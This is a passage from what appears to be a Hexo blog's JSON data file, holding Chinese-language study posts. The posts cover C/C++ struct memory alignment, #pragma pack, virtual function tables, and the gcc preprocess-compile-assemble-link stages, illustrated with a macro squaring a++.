C++中class的虚函数</h4><p>C++中的虚函数机制保证了动态绑定，实现了直到程序执行的时候才选择执行哪个代码．一般编译器的实现是在对象空间(类被实例化后)开始的4字节(32位OS)保存一个虚函数表指针，继承了几个类中的虚函数，一般就会产生几个虚函数表指针，再加上数据成员(除去静态成员),这个对象的大小大概就是这么多了．类的方法并不单独属于对象，每一次调用方法的时候必须要传入this指针，其实就是这个对象的首地址．在VC++中一般采用intel 的ecx寄存器作为this指针的载体．例如(<code>obj.func(a, b, c);</code>)在编译器翻译的汇编代码里面等价于(<code>func(&amp;obj, a, b, c);</code>),某些编译器甚至允许这样调用．因为底层的汇编代码一样啊….</p>\n<hr>\n<p>先总结这么多吧，其实想真正弄清楚的话还需亲自实现或者读懂一个编译器，不仅仅考虑编译原理里面的词语法分析等，而更要从硬件层面取理解各种软件设计思维模式．毕竟软件是跑在硬件这个载体上面的，各种效率问题要经得起推敲的，为啥选择了GNU/Linux呢？可不仅仅因为是开源免费的原因吧~_~</p>\n","excerpt":"","more":"<h2 id=\"关于C-C-中结构体-类-内存对齐问题\"><a href=\"#关于C-C-中结构体-类-内存对齐问题\" class=\"headerlink\" title=\"关于C/C++中结构体(类)内存对齐问题\"></a>关于C/C++中结构体(类)内存对齐问题</h2><hr>\n<blockquote>\n<p>各种笔试面试都会涉及的问题，具体的可以查阅相关标准(如C99,C11等)或者翻阅国外知名论坛<a href=\"http://stackoverflow.com/\" title=\"Stack Overflow\">stackoverflow</a>等寻找相关资料进一步分析，我个人的一些总结如下，如有不对之处，还请诸位不吝赐教．</p>\n</blockquote>\n<hr>\n<p>可参考资料：<br><a href=\"https://en.wikipedia.org/wiki/Data_structure_alignment#Problems\" title=\"维基百科\">维基百科</a><br><a href=\"http://stackoverflow.com/questions/2554229/memory-alignment-within-gcc-structs\">StackOverflow GCC Structure</a><br><a href=\"https://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html\">GCC文档</a></p>\n<h3 id=\"1-首先放出现代PC编译器在实现的时候对于字长的一些典型约定\"><a href=\"#1-首先放出现代PC编译器在实现的时候对于字长的一些典型约定\" class=\"headerlink\" title=\"1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:\"></a>1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:</h3><h4 id=\"32位编译器：\"><a href=\"#32位编译器：\" class=\"headerlink\" title=\"32位编译器：\"></a>32位编译器：</h4><pre><code>char ：1个字节\nchar*（即指针变量）: 4个字节（32位的寻址空间是2^32, 即32个bit，也就是4个字节。同理64位编译器）\nshort int : 2个字节\nint：  4个字节\nunsigned int : 4个字节\nfloat:  4个字节\ndouble:   8个字节\nlong:   4个字节\nlong long:  8个字节\nunsigned long:  4个字节\n</code></pre><h4 id=\"64位编译器：\"><a href=\"#64位编译器：\" class=\"headerlink\" title=\"64位编译器：\"></a>64位编译器：</h4><pre><code>char ：1个字节\nchar* (即指针变量): 8个字节\nshort int : 2个字节\nint：  4个字节\nunsigned int : 4个字节\nfloat:  4个字节\ndouble:   8个字节\nlong:   8个字节\nlong long:  8个字节\nunsigned long:  8个字节  \n</code></pre><p>其中特别需要说明的一点就是指针类型的，任何类型的指针字长(当然包括结构体和类等复合类型)几乎应该只与编译器平台或者说是处理器地址总线长度有关(当然类似8086这种16位的处理器20根地址线的CPU等就另当别论了).关于这一点我认为学过体系结构和组成原理的同学应该会有深刻体会(我们组成原理课有实验就是按照教程实现一个简单的CPU)．在C语言中直接使用操作符sizeof(type)就可以得到字节大小，注意这个sizeof不是一个函数而是一个操作符．操作符的话表明结果已经在编译的时候确定了，而函数的话如果编译器不进行优化则等到运行时被调用才会返回值．关于这一点sizeof在有数组的参数中会发生一些奇妙的事情．</p>\n<hr>\n<h3 id=\"2-变量排放规则-自己的见解\"><a href=\"#2-变量排放规则-自己的见解\" class=\"headerlink\" title=\"2. 变量排放规则(自己的见解)\"></a>2. 变量排放规则(自己的见解)</h3><h4 id=\"1-内置类型对象-如char、int-lt-现代PC编译器普遍为4字节-gt-等-的对齐起始地址为其本身大小和编译器默认大小（或用-pragma-pack（n-指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1-2-4-8等2的幂值）中最小的一个的整数倍\"><a href=\"#1-内置类型对象-如char、int-lt-现代PC编译器普遍为4字节-gt-等-的对齐起始地址为其本身大小和编译器默认大小（或用-pragma-pack（n-指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1-2-4-8等2的幂值）中最小的一个的整数倍\" class=\"headerlink\" title=\"1. 内置类型对象(如char、int&lt;现代PC编译器普遍为4字节&gt;等)的对齐起始地址为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.\"></a>1. 内置类型对象(如char<1字节>、int&lt;现代PC编译器普遍为4字节&gt;等)的<strong>对齐起始地址</strong>为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.</h4><h4 id=\"2-整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用-pragma-pack-n-指定的n中两者较小的那个的整数倍-而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。\"><a href=\"#2-整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用-pragma-pack-n-指定的n中两者较小的那个的整数倍-而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。\" class=\"headerlink\" title=\"2. 整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。\"></a>2. 整个结构体或者类的<strong>大小</strong>为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。</h4><blockquote>\n<p>可能听起来很拗口，但是一旦把握了准则在应对这些问题的时候就很轻而易举了．其实主要是两个点，一个是变量放的偏移地址，另一个是复杂类型的总的大小．首先我们要知道为什么编译器需要对变量进行内存对齐？知道内存组织的童鞋可能有些感触，我们的代码运行的时候必须首先从磁盘(或其他非易失性介质)通过外部总线加载到内存中，然后再跳转到相应处运行．基于现有的计算机运行机制不断地进行<strong>取指，译码，执行等</strong>操作，由于内存本身的半导体的物理特性使得内存并不是一次性有几个G那么多而是通过很小的介质(一般是8位)不断地”串并联”起来的，一般能够保证一个地址能够寻址一个字节的数据，其实是半导体的导通与截止表示的计算机中的”1”和”0”．打个比方，如果地址不是偶数的，要取偶数个的数据的话，CPU在硬件上可能要多花几个时钟周期来进行取数据和整合，才能保证数据不出错．因此很多算法也都是以空间换时间的思想来加快计算．还有就是在嵌入式领域，由于板子或者芯片本身的内存资源非常有限，必须要求嵌入式程序员写出几乎<code>磕碜</code>的代码才能保证运行流畅等．因此，至少在不怎么缺内存的PC或者Server领域，为了加快计算，还是可以采用编译器进行的优化的．(可能还有其他技术比如缓存啥的我们先不讨论)</p>\n</blockquote>\n<h3 id=\"3-Win栗子如下：\"><a href=\"#3-Win栗子如下：\" class=\"headerlink\" title=\"3. Win栗子如下：\"></a>3. Win栗子如下：</h3><h4 id=\"1-这是以前我用Win的时候VC-6-0编译器的效果图\"><a href=\"#1-这是以前我用Win的时候VC-6-0编译器的效果图\" class=\"headerlink\" title=\"1. 这是以前我用Win的时候VC++ 6.0编译器的效果图\"></a>1. 这是以前我用Win的时候VC++ 6.0编译器的效果图</h4><p><img src=\"/images/1.png\" alt=\"配置\"></p>\n<h4 id=\"2-此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\"><a href=\"#2-此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\" class=\"headerlink\" title=\"2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\"></a>2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的</h4><p><img src=\"/images/2.png\" alt=\"int b\"></p>\n<h4 id=\"3-下面这一处说明大小是按照int类型-最大呀-的整数倍来取\"><a href=\"#3-下面这一处说明大小是按照int类型-最大呀-的整数倍来取\" class=\"headerlink\" title=\"3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取\"></a>3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取</h4><p><img src=\"/images/3.png\" alt=\"整数倍\"></p>\n<h4 id=\"4-说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\"><a href=\"#4-说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\" class=\"headerlink\" title=\"4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\"></a>4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小</h4><p><img src=\"/images/4.png\" alt=\"数组\"></p>\n<h4 id=\"5-说明第二个元素char类型的可以在任何偏移处安放-因为它是一个字节啊\"><a href=\"#5-说明第二个元素char类型的可以在任何偏移处安放-因为它是一个字节啊\" class=\"headerlink\" title=\"5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)\"></a>5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)</h4><p><img src=\"/images/5.png\" alt=\"char\"></p>\n<h4 id=\"6-说明-pragma-pack-n-n非2的幂的值时候无效\"><a href=\"#6-说明-pragma-pack-n-n非2的幂的值时候无效\" class=\"headerlink\" title=\"6. 说明#pragma pack (n) n非2的幂的值时候无效\"></a>6. 说明#pragma pack (n) n非2的幂的值时候无效</h4><p><img src=\"/images/6.png\" alt=\"#pragma pack (n)\"></p>\n<h4 id=\"7-说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\"><a href=\"#7-说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\" class=\"headerlink\" title=\"7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\"></a>7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数</h4><p><img src=\"/images/7.png\" alt=\"struct\"></p>\n<h4 id=\"8-说明pragma-pack-3-没作用\"><a href=\"#8-说明pragma-pack-3-没作用\" class=\"headerlink\" title=\"8. 说明pragma pack (3)没作用\"></a>8. 说明pragma pack (3)没作用</h4><p><img src=\"/images/8.png\" alt=\"pack (3)\"></p>\n<h3 id=\"4-Linux栗子如下-据说gcc默认是4-bytes的对齐大小-：\"><a href=\"#4-Linux栗子如下-据说gcc默认是4-bytes的对齐大小-：\" class=\"headerlink\" title=\"4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：\"></a>4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：</h3><h4 id=\"1-这是我用ubuntu-16-04-amd64-ssh连接ubuntu-16-04-i386之后gcc版本号\"><a href=\"#1-这是我用ubuntu-16-04-amd64-ssh连接ubuntu-16-04-i386之后gcc版本号\" class=\"headerlink\" title=\"1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:\"></a>1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:</h4><p><img src=\"/images/gcc-st-1.png\" alt=\"gcc -v\"></p>\n<h4 id=\"2-这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\"><a href=\"#2-这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\" class=\"headerlink\" title=\"2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\"></a>2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节</h4><p><img src=\"/images/gcc-st-2.png\" alt=\"4 butys\"></p>\n<h4 id=\"3-在gcc中加入功能和pragma-pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…\"><a href=\"#3-在gcc中加入功能和pragma-pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…\" class=\"headerlink\" title=\"3. 在gcc中加入功能和pragma pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…\"></a>3. 在gcc中加入功能和pragma pack差不多的<strong>attribute</strong>选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…</h4><p><img src=\"/images/gcc-st-3.png\" alt=\"attri_1\"></p>\n<h4 id=\"4-在这里只是a之后的那一个字节是填充的-short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事\"><a href=\"#4-在这里只是a之后的那一个字节是填充的-short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事\" class=\"headerlink\" title=\"4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事~\"></a>4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，<strong>attribute</strong>干得好事~</h4><p><img src=\"/images/gcc-st-4.png\" alt=\"attri_2\"></p>\n<h4 id=\"5-证明了有pack为1的地方必定不留一点空隙\"><a href=\"#5-证明了有pack为1的地方必定不留一点空隙\" class=\"headerlink\" title=\"5. 证明了有pack为1的地方必定不留一点空隙~~~\"></a>5. 证明了有pack为1的地方必定不留一点空隙~~~</h4><p><img src=\"/images/gcc-st-5.png\" alt=\"pack_1\"></p>\n<h4 id=\"6-第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢-应该是它自己作为结构体的时候元素中最大的-这个栗子为double-要是有char-类型数组超过8，不用管，认为是char-和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\"><a href=\"#6-第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢-应该是它自己作为结构体的时候元素中最大的-这个栗子为double-要是有char-类型数组超过8，不用管，认为是char-和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\" class=\"headerlink\" title=\"6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\"></a>6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．</h4><p><img src=\"/images/gcc-st-6.png\" alt=\"st_to_st\"></p>\n<h4 id=\"7-由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\"><a href=\"#7-由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\" class=\"headerlink\" title=\"7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\"></a>7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．</h4><p><img src=\"/images/gcc-st-7.png\" alt=\"st_to_aligned(1)\"></p>\n<h3 id=\"5-C-中的高级之处\"><a href=\"#5-C-中的高级之处\" class=\"headerlink\" title=\"5. C++中的高级之处\"></a>5. C++中的高级之处</h3><blockquote>\n<p>至于C和C++的区别我就不再重复教科书上的内容．只是觉得作为一个developer可能只会关心功能实现，不会管各种机制的内部实现，反正丢给编译器去翻译和安排就是咯，咱又不是研究者．但是一旦出现bug且需要调试器支持的时候，底层的实现就不得不去啃了．编译器也是人开发出来的，当然也少不了出问题，只是现代开发体系为了降低开发难度因此对计算机的<strong>封装</strong>程度已经快到了<code>说话编程</code>的地步了．重复造轮子有必要吗？珍爱生命，快用py？  </p>\n</blockquote>\n<h4 id=\"1-C-中的结构体和类的区别？\"><a href=\"#1-C-中的结构体和类的区别？\" class=\"headerlink\" title=\"1.C++中的结构体和类的区别？\"></a>1.C++中的结构体和类的区别？</h4><p>根据C++的标准它俩的区别应该只是默认的访问权限的不同，其他该有的编译器(比如构造函数，析构函数等)还是会允许程序员实现的．以前在微博上分析过一道题<a href=\"http://weibo.com/p/230418e682a92a0102w5wl?mod=zwenzhang\">链接</a>.因此，在C++中，为了让编译器能够根据标准对各种权限进行检查并生成程序员想要的代码，还是用class比较好．我们不能单调地看待private声明或者const的成员，认为它是不可能被子类或者其他非正常手段修改的．要知道我们所谓的编程最主要是根据标准和规则对编译器进行交互，让编译器取帮我们做翻译工作，一旦编译器通过，程序被加载到内存中后一切的一切被视为<code>高低电平</code>或者其他二进制信息，到时候让CPU译码之后想怎么干就怎么干~_~(当然这是intel 8086时代，从286开始就开始了保护模式).</p>\n<h4 id=\"2-C-中class的虚函数\"><a href=\"#2-C-中class的虚函数\" class=\"headerlink\" title=\"2. C++中class的虚函数\"></a>2. C++中class的虚函数</h4><p>C++中的虚函数机制保证了动态绑定，实现了直到程序执行的时候才选择执行哪个代码．一般编译器的实现是在对象空间(类被实例化后)开始的4字节(32位OS)保存一个虚函数表指针，继承了几个类中的虚函数，一般就会产生几个虚函数表指针，再加上数据成员(除去静态成员),这个对象的大小大概就是这么多了．类的方法并不单独属于对象，每一次调用方法的时候必须要传入this指针，其实就是这个对象的首地址．在VC++中一般采用intel 的ecx寄存器作为this指针的载体．例如(<code>obj.func(a, b, c);</code>)在编译器翻译的汇编代码里面等价于(<code>func(&amp;obj, a, b, c);</code>),某些编译器甚至允许这样调用．因为底层的汇编代码一样啊….</p>\n<hr>\n<p>先总结这么多吧，其实想真正弄清楚的话还需亲自实现或者读懂一个编译器，不仅仅考虑编译原理里面的词语法分析等，而更要从硬件层面取理解各种软件设计思维模式．毕竟软件是跑在硬件这个载体上面的，各种效率问题要经得起推敲的，为啥选择了GNU/Linux呢？可不仅仅因为是开源免费的原因吧~_~</p>\n"},{"title":"C语言宏定义小试","date":"2016-09-06T12:51:30.000Z","_content":"\n> 今天方小白童鞋笔试了CVTE，遇到了很多Linux开发的问题，其实不乏有关于内核配置，boot启动分析相关试题等等，在这里主要分析一下C语言中宏定义的问题.主要侧重于实战了，具体的还是要根据标准来。我用的实验平台是ubuntu 16.04 i386。\n\n---\n\n# gcc编译过程分析\n![gcc_program](/images/gcc_program.png)\n\n如上图所示，上图是在**《程序员自我修养》**这本书里面看到的，首先头文件和源文件在预处理阶段会融合在一起，生成.i文件。然后经过编译会生成.s文件，内容是汇编语言形式，之后经过汇编过程后变成.o的目标文件，这个文件其实已经成为了机器码了，但是缺乏加载地址以及函数符号问题未解决等，最后经过和库文件等进行链接生成可执行的二进制文件。在Linux下为elf格式，Windows下为PE格式。执行的时候将由各自的加载器对可执行文件中的代码和数据等进行解析并加载至内存中相应的属性页。当然如果直接一步`gcc sources -o target`是看不到这些过程的，gcc会一次性完成这些操作。下面我们就来实战一下吧。测试的源代码如下，有兴趣的还可以改用`++a`看看结果。\n```C\n#include <stdio.h>\n\n#define F(x) ((x)*(x))\nvoid main(void)\n{\n\tint a = 4;\n\t//printf(\"%d\\n\", F(++a));\n\tprintf(\"%d\\n\", F(a++));\n}\n```\n\n# 预处理\n首先我们看下图的源文件，其中就是涉及到了主要矛盾，**宏定义**。这个在C语言中用得相当多的一个技巧。在C++中会推荐使用**const**。具体缘由请自行搜索。像这种运算会产生问题的地方就是将变量填充为单目运算符的时候会发生问题。\n![compile](/images/compile.png)\n接下来我们键入\n```C\ngcc -E mocro_define.c -o mocro_define.i\n```\n![define_E](/images/define_E.png)\n我们可以看到在生在.i文件之后，最后的几行代码被改变了，其中就是define被展开了。而且gcc在.i文件中插入了大量的外部引用和声明。总计有800多行。接下来我们看怎么编译。\n\n# 编译\n我们键入以下命令，其中的`-masm=intel`选项是让生成的汇编代码为intel格式的而非AT&T格式的，个人还是习惯看intel格式的。\n```C\ngcc -S mocro_define.i -o mocro_define.s -masm=intel\n```\n![define_S](/images/define_S.png)\n主要的部分如下图所示，其中很多.开头的都是一些符号，不必在意。程序段在开辟新的空间之后直接将4赋值给了`[ebp-12]`,即a。然后再将它的值送到`edx`寄存器，之后编译器利用`lea`指令优化使得`a++`执行，而后立即回送至内存中的a。之后又使得`a++`执行并回送至内存中。但是注意到，`imul`指令执行的时候仍然用的是`edx`和`eax`的值，即4\\*5,而`ecx`值虽然为6(最后的a)但是并不参与运算。最后直接将`eax`压栈`call printf`即可打印出来结果。在这里可以看出两个`a++`仅仅只有一个值是参与了乘法运算，详情可以参考优先级策略，可以深刻地理解编译器是如何处理这个类似`a++`运算符的。\n![define_S_main](/images/define_S_main.png)\n\n# 汇编\n之后我们键入以下命令继续这个过程：\n```C\ngcc -c mocro_define.s -o mocro_define.o\n```\n![define_c](/images/define_c.png)\n我们用readelf工具可以知道已经生成了与平台相关的目标代码了，这一步gcc内部封装的是as工具，当然我们也可以单独用as命令来执行汇编过程。特别是开发asm程序的时候可能会用到。接下来进行最后的链接过程。\n# 链接\n键入以下命令并执行可执行程序：\n```C\ngcc mocro_define.o -o mocro_define\n./mocro_define\n```\n![define_o](/images/define_o.png)\n最后的结果就是汇编当中的代码分析过程。当然这一步也是gcc内部封装的ld工具，我们也可以手动执行，但是太麻烦，还要解决引入的库文件等问题。\n\n# 总结\n这篇文章主要还是从C程序的编译过程来逐步拆解分析。**宏定义**本身还是不严格的直接替换式地插入,对于类型检查不严格，对于表达式不计算，才会导致问题的发生。我们稍微调试一下明白了。建议还是从C语言的运算符优先级入手，分析这个过程可能容易很多，因为编译器也是遵照标准来实现的。\n","source":"_posts/C语言宏定义小试.md","raw":"---\ntitle: C语言宏定义小试\ndate: 2016-09-06 20:51:30\ntags:\n- C/C++\n- Linux\ncategories:\n- study\n---\n\n> 今天方小白童鞋笔试了CVTE，遇到了很多Linux开发的问题，其实不乏有关于内核配置，boot启动分析相关试题等等，在这里主要分析一下C语言中宏定义的问题.主要侧重于实战了，具体的还是要根据标准来。我用的实验平台是ubuntu 16.04 i386。\n\n---\n\n# gcc编译过程分析\n![gcc_program](/images/gcc_program.png)\n\n如上图所示，上图是在**《程序员自我修养》**这本书里面看到的，首先头文件和源文件在预处理阶段会融合在一起，生成.i文件。然后经过编译会生成.s文件，内容是汇编语言形式，之后经过汇编过程后变成.o的目标文件，这个文件其实已经成为了机器码了，但是缺乏加载地址以及函数符号问题未解决等，最后经过和库文件等进行链接生成可执行的二进制文件。在Linux下为elf格式，Windows下为PE格式。执行的时候将由各自的加载器对可执行文件中的代码和数据等进行解析并加载至内存中相应的属性页。当然如果直接一步`gcc sources -o target`是看不到这些过程的，gcc会一次性完成这些操作。下面我们就来实战一下吧。测试的源代码如下，有兴趣的还可以改用`++a`看看结果。\n```C\n#include <stdio.h>\n\n#define F(x) ((x)*(x))\nvoid main(void)\n{\n\tint a = 4;\n\t//printf(\"%d\\n\", F(++a));\n\tprintf(\"%d\\n\", F(a++));\n}\n```\n\n# 预处理\n首先我们看下图的源文件，其中就是涉及到了主要矛盾，**宏定义**。这个在C语言中用得相当多的一个技巧。在C++中会推荐使用**const**。具体缘由请自行搜索。像这种运算会产生问题的地方就是将变量填充为单目运算符的时候会发生问题。\n![compile](/images/compile.png)\n接下来我们键入\n```C\ngcc -E mocro_define.c -o mocro_define.i\n```\n![define_E](/images/define_E.png)\n我们可以看到在生在.i文件之后，最后的几行代码被改变了，其中就是define被展开了。而且gcc在.i文件中插入了大量的外部引用和声明。总计有800多行。接下来我们看怎么编译。\n\n# 编译\n我们键入以下命令，其中的`-masm=intel`选项是让生成的汇编代码为intel格式的而非AT&T格式的，个人还是习惯看intel格式的。\n```C\ngcc -S mocro_define.i -o mocro_define.s -masm=intel\n```\n![define_S](/images/define_S.png)\n主要的部分如下图所示，其中很多.开头的都是一些符号，不必在意。程序段在开辟新的空间之后直接将4赋值给了`[ebp-12]`,即a。然后再将它的值送到`edx`寄存器，之后编译器利用`lea`指令优化使得`a++`执行，而后立即回送至内存中的a。之后又使得`a++`执行并回送至内存中。但是注意到，`imul`指令执行的时候仍然用的是`edx`和`eax`的值，即4\\*5,而`ecx`值虽然为6(最后的a)但是并不参与运算。最后直接将`eax`压栈`call printf`即可打印出来结果。在这里可以看出两个`a++`仅仅只有一个值是参与了乘法运算，详情可以参考优先级策略，可以深刻地理解编译器是如何处理这个类似`a++`运算符的。\n![define_S_main](/images/define_S_main.png)\n\n# 汇编\n之后我们键入以下命令继续这个过程：\n```C\ngcc -c mocro_define.s -o mocro_define.o\n```\n![define_c](/images/define_c.png)\n我们用readelf工具可以知道已经生成了与平台相关的目标代码了，这一步gcc内部封装的是as工具，当然我们也可以单独用as命令来执行汇编过程。特别是开发asm程序的时候可能会用到。接下来进行最后的链接过程。\n# 链接\n键入以下命令并执行可执行程序：\n```C\ngcc mocro_define.o -o mocro_define\n./mocro_define\n```\n![define_o](/images/define_o.png)\n最后的结果就是汇编当中的代码分析过程。当然这一步也是gcc内部封装的ld工具，我们也可以手动执行，但是太麻烦，还要解决引入的库文件等问题。\n\n# 总结\n这篇文章主要还是从C程序的编译过程来逐步拆解分析。**宏定义**本身还是不严格的直接替换式地插入,对于类型检查不严格，对于表达式不计算，才会导致问题的发生。我们稍微调试一下明白了。建议还是从C语言的运算符优先级入手，分析这个过程可能容易很多，因为编译器也是遵照标准来实现的。\n","slug":"C语言宏定义小试","published":1,"updated":"2016-11-14T02:56:11.008Z","_id":"civhnccvh000ag8ua61phdzm9","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>今天方小白童鞋笔试了CVTE，遇到了很多Linux开发的问题，其实不乏有关于内核配置，boot启动分析相关试题等等，在这里主要分析一下C语言中宏定义的问题.主要侧重于实战了，具体的还是要根据标准来。我用的实验平台是ubuntu 16.04 i386。</p>\n</blockquote>\n<hr>\n<h1 id=\"gcc编译过程分析\"><a href=\"#gcc编译过程分析\" class=\"headerlink\" title=\"gcc编译过程分析\"></a>gcc编译过程分析</h1><p><img src=\"/images/gcc_program.png\" alt=\"gcc_program\"></p>\n<p>如上图所示，上图是在<strong>《程序员自我修养》</strong>这本书里面看到的，首先头文件和源文件在预处理阶段会融合在一起，生成.i文件。然后经过编译会生成.s文件，内容是汇编语言形式，之后经过汇编过程后变成.o的目标文件，这个文件其实已经成为了机器码了，但是缺乏加载地址以及函数符号问题未解决等，最后经过和库文件等进行链接生成可执行的二进制文件。在Linux下为elf格式，Windows下为PE格式。执行的时候将由各自的加载器对可执行文件中的代码和数据等进行解析并加载至内存中相应的属性页。当然如果直接一步<code>gcc sources -o target</code>是看不到这些过程的，gcc会一次性完成这些操作。下面我们就来实战一下吧。测试的源代码如下，有兴趣的还可以改用<code>++a</code>看看结果。<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> F(x) ((x)*(x))</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> a = <span class=\"number\">4</span>;</div><div class=\"line\">\t<span class=\"comment\">//printf(\"%d\\n\", F(++a));</span></div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, F(a++));</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"预处理\"><a href=\"#预处理\" class=\"headerlink\" title=\"预处理\"></a>预处理</h1><p>首先我们看下图的源文件，其中就是涉及到了主要矛盾，<strong>宏定义</strong>。这个在C语言中用得相当多的一个技巧。在C++中会推荐使用<strong>const</strong>。具体缘由请自行搜索。像这种运算会产生问题的地方就是将变量填充为单目运算符的时候会发生问题。<br><img 